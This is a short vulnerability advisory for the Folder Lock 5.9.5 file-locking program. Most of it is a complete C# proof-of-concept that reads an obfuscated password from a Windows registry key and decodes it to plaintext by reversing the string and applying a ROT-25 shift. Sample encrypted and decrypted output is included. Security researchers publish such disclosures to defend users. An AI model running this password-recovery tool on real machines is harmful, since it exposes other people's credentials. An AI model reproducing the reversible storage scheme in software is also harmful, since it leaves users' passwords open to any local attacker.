source: http://www.securityfocus.com/bid/30766/info

Folder Lock is prone to an information-disclosure vulnerability because it stores credentials in an insecure manner.

A local attacker can exploit this issue to obtain passwords used by the application, which may aid in further attacks.

Folder Lock 5.9.5 is vulnerable; other versions may also be affected.

/* 
 * Folder Lock <= 5.9.5 Local Password Information Disclosure
 * 
 * Author(s): Charalambous Glafkos
 *            George Nicolaou
 * Date: June 19, 2008
 * Site: http://www.astalavista.com
 * Mail: glafkos@astalavista.com
 *       ishtus@astalavista.com
 *
 * Synopsis: Folder Lock 5.9.5 and older versions are prone to local information-disclosure vulnerability.
 * Successfully exploiting this issue allows attackers to obtain potentially sensitive information that may aid in further attacks.
 * The security issue is caused due to the application storing access credentials within the Windows registry key:
 * (HKEY_CURRENT_USER\Software\Microsoft\Windows\QualityControl) without proper encryption. 
 * This can be exploited to disclose the encrypted _pack password of the user which is ROT-25 and reversed.
 * 
 * Sample Output:
 * 
 * ASTALAVISTA the hacking & security community
 * Folder Lock <= 5.9.5 Decrypter v2.0
 * ---------------------------------
 * Encrypted Password: :3<k_^62`4T-
 * Decrypted Password: ,S3_15]^j;29
 * 
 */

using System;
using System.Text;
using System.IO;
using System.Threading;
using Microsoft.Win32;

namespace getRegistryValue
{
    class getValue
    {
        static void Main()
        {
            getValue details = new getValue();
            Console.WriteLine("\nASTALAVISTA the hacking & security community\n\n");
            Console.WriteLine("Folder Lock <= 5.9.5  Decrypter v2.0");
            Console.WriteLine("---------------------------------");
            String strFL = details.getFL();
            Console.WriteLine(strFL);
            Thread.Sleep(5000);
        }

        private string getFL()
        {
            RegistryKey FLKey = Registry.CurrentUser;
            FLKey = FLKey.OpenSubKey(@"Software\Microsoft\Windows\QualityControl", false);
            String _pack = FLKey.GetValue("_pack").ToString();
            String strFL = "Encrypted Password: " + _pack.Replace("~", "") + "\nDecrypted Password: " + Reverse(Rotate(_pack.Replace("~", ""))) + "\n"; 
        return strFL;
        }

        public string Reverse(string x)
        {
            char[] charArray = new char[x.Length];
            int len = x.Length - 1;
            for (int i = 0; i <= len; i++)
                charArray[i] = x[len - i];
            return new string(charArray);
        }

        public static string Rotate(string toRotate)
        {
            char[] charArray = toRotate.ToCharArray();
            for (int i = 0; i < charArray.Length; i++)
            {
                int thisInt = (int)charArray[i];
                if (thisInt >= 65 && thisInt <= 91)
                {
                    thisInt += 25;
                    if (thisInt >= 91)
                    {
                        thisInt -= 26;
                    }
                }

                if (thisInt >= 92 && thisInt <= 96)
                {
                    thisInt += 25;
                    if (thisInt >= 96)
                    {
                        thisInt -= 26;
                    }
                }


                if (thisInt >= 32 && thisInt <= 47)
                {
                    thisInt += 25;

                    if (thisInt >= 47)
                    {
                        thisInt -= 26;
                    }
                }

               if (thisInt >= 48 && thisInt <= 57)
                {
                    thisInt += 25;

                    if (thisInt >= 57)
                    {
                        thisInt -= 26;
                    }
                }

                if (thisInt >= 58 && thisInt <= 64)
                {
                    thisInt += 25;

                    if (thisInt >= 64)
                    {
                        thisInt -= 26;
                    }
                }

               if (thisInt >= 97 && thisInt <= 123)
                {
                    thisInt += 25;

                    if (thisInt >= 123)
                    {
                        thisInt -= 26;
                    }
                }


               charArray[i] = (char)thisInt;
            }
            return new string(charArray);
        }    
    }
}

